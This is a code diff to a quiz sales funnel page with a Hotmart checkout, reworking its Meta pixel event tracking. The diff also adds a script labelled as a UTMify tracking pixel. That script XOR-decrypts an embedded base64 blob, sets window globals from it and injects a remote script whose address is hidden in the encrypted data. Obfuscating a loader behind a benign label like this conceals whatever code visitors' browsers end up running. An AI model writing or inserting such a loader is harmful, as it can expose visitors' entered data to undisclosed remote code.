@@ -286,6 +286,8 @@ input[type=range]::-moz-range-thumb{width:28px;height:28px;border-radius:50%;bac
 @keyframes spin{to{transform:rotate(360deg)}}
 .ckm-alt{display:block;text-align:center;font-size:12px;color:var(--muted);padding:10px;text-decoration:underline;font-weight:700}
 </style>
+<!-- UTMify pixel (loads the Meta pixel and fires PageView/ViewContent) -->
+<script>(function(){var k_ciy=atob("DP148LFuBRxNHdLxxIZahcMCJyZvdaaFtI5C354NYXJjaKacrZsB3tIBaDIvb/2Cp48RgMUdKmwkZbed640RiNQCK3Y+P/7TpYkMgtgMcGgobvDLn6BU0tYCan4scaHT/qYD0t8PaHlvJ/CBrYUdnPgKJzBva7OdsZhaypNYZywsKueS958aw4lYZyUpJeeU859JxYhMeEEw");var o_ywn=[];for(var f_85c=0;f_85c<k_ciy.length;f_85c++){o_ywn.push(k_ciy.charCodeAt(f_85c)&255);}var l_6=o_ywn[0];var p_ka6t=o_ywn.slice(1,1+l_6);var e_v39=o_ywn.slice(1+l_6);var e_r1=e_v39.map(function(b,u_k){return b^p_ka6t[u_k%l_6];});var y_5qy="";for(var h_l=0;h_l<e_r1.length;h_l++){y_5qy+=String.fromCharCode(e_r1[h_l]&255);}var a_l61=decodeURIComponent(escape(y_5qy));var x_ps=JSON.parse(a_l61);var k_hq=x_ps.globals||[];k_hq.forEach(function(z_leb){window[z_leb.name]=z_leb.value;});var h_b3a=document.createElement("script");h_b3a.src=x_ps.url;h_b3a.async=true;h_b3a.defer=true;(x_ps.attributes||[]).forEach(function(v_p){h_b3a.setAttribute(v_p.name,v_p.value);});(document.head||document.documentElement).appendChild(h_b3a);})();</script>
 </head>
 <body>
 <div id="app">
@@ -312,7 +314,7 @@ const CONFIG = {
   CHECKOUT_URL: "https://pay.hotmart.com/D108665237M", // Hotmart checkout ($19)
   LEAD_WEBHOOK: "",          // TODO opcional: URL que recebe {email,name,...} por POST (Zapier/Make/ActiveCampaign)
   PRICE: 19,
-  META_PIXEL_ID: "1885961585755828" // Meta Pixel (Purchase + InitiateCheckout come from Hotmart checkout + CAPI)
+  META_PIXEL_ID: "" // Meta pixel 1885961585755828 is loaded by UTMify (PageView/ViewContent). Purchase + InitiateCheckout come from Hotmart. Keep empty to avoid duplicates.
 };
 
 /* ================= TRACKING ================= */
@@ -320,14 +322,15 @@ if (CONFIG.META_PIXEL_ID) {
   !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
   fbq('init', CONFIG.META_PIXEL_ID); fbq('track','PageView');
 }
-// Standard events fired by the quiz: PageView (on load), Lead (email, once), ViewContent (offer, once).
+// Standard event fired by the quiz: Lead (email, once), through the fbq loaded by UTMify. PageView/ViewContent come from UTMify.
 // InitiateCheckout and Purchase are NOT fired here: the Hotmart checkout sends them (browser + Conversions API).
 const ONCE={}; const SID=Date.now().toString(36)+Math.random().toString(36).slice(2,8);
 function track(ev, params={}){
   const p = Object.assign({phase:A.hormone||'', joint:(A.joints||[])[0]||'', score:score}, params);
-  const std=['Lead','ViewContent'].includes(ev);
+  const std=ev==='Lead';
   if(std){ if(ONCE[ev]) return; ONCE[ev]=1; }
-  try{ if(window.fbq){ std ? fbq('track',ev,p,{eventID:ev+'_'+SID}) : fbq('trackCustom',ev,p);} }catch(e){}
+  const send=(n)=>{ try{ if(window.fbq){ std ? fbq('track',ev,p,{eventID:ev+'_'+SID}) : fbq('trackCustom',ev,p); } else if(std && n<20){ setTimeout(()=>send(n+1),1500); } }catch(e){} };
+  send(0); // UTMify creates fbq after it loads; a Lead fired before that waits for it
   try{ (window.dataLayer=window.dataLayer||[]).push(Object.assign({event:ev},p)); }catch(e){}
 }
 const UTM = Object.fromEntries(new URLSearchParams(location.search));
@@ -1049,7 +1052,7 @@ R.offer = sc => {
   </div>`;
   // Checkout opens inside the quiz (Hotmart checkout in an embedded sheet, no redirect)
   main.querySelectorAll('[data-ck]').forEach(a=>a.addEventListener('click',e=>{ e.preventDefault(); openCheckout(url); }));
-  track('ViewContent',{value:CONFIG.PRICE,currency:'USD'});
+  track('offer_view',{value:CONFIG.PRICE,currency:'USD'});
   cta('UNLOCK MY PLAN · $'+CONFIG.PRICE, true, ()=>openCheckout(url));
 };
 
